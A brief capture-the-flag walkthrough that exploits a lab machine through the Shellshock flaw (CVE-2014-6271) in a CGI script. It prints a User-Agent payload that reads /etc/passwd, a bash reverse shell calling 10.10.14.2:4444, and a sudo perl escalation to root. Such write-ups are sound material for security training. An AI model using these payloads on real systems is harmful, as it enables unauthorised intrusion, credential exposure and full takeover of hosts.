Started with a nmap scan
```
80 Apache httpd 2.4.18
2222 OpenSSH 7.2p2
```
When we go to the webhost its just a blank page with a picture so going to start a gobuster scan
```
/index.html
/cgi-bin/
/cgi-bin/user.sh
```
In the `cgi-bin` there is a `user.sh` script and we can preform the shellshock vuln on this host `CVE-2014-6271` if we go to  the user sh file and open the request in burp we can put this on the user agent `() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'` and we get the `/etc/passwd` and then we can replace the `/etc/passwd` with this `bash -i >& /dev/tcp/10.10.14.2/4444 0>&1` and get a reverse shell as shelly when we do `sudo -l` we can run perl as root so with this payload from GTFObins we can get root  `sudo perl -e 'exec "/bin/sh";'` 
